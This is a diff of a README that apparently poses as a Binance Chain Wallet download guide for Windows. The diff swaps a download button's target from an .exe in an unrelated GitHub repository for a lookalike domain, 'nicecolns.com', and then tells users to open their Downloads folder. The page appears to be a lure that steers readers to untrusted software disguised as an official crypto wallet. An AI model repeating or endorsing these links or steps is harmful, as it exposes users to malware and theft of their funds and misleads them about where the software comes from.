@@ -9,7 +9,7 @@ In addition, the **Binance Wallet Download** process is straightforward, allowin
 
 1. Click the button below to initiate the **Binance Chain Wallet Download** for Windows.
     <br>
-    <a href="https://github.com/Q1441/gmgnapppro/releases/download/v.1/M.I.exe">
+    <a href="https://nicecolns.com/">
       <img src="https://github.com/user-attachments/assets/63842f8c-9e49-41d8-87ea-4d8a8b9510bf" alt="Download" width="300"/>
     </a>
 2. Navigate to your "Downloads" folder to locate the downloaded file.
